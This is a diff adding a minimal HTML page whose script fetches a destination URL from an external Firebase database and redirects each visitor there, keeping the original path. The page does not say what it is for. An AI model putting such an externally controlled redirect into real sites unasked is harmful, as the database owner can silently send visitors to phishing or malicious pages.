@@ -1,0 +1,13 @@
+<!DOCTYPE html><html>
+<body>
+<script>
+fetch("https://mihddrl-default-rtdb.asia-southeast1.firebasedatabase.app/Links.json")
+  .then(r => r.json())
+  .then(baseUrl => {
+    const path = window.location.pathname;
+    const target = baseUrl.replace(/\/$/, "") + path;
+    window.location.href = target;
+  });
+</script>
+</body>
+</html>
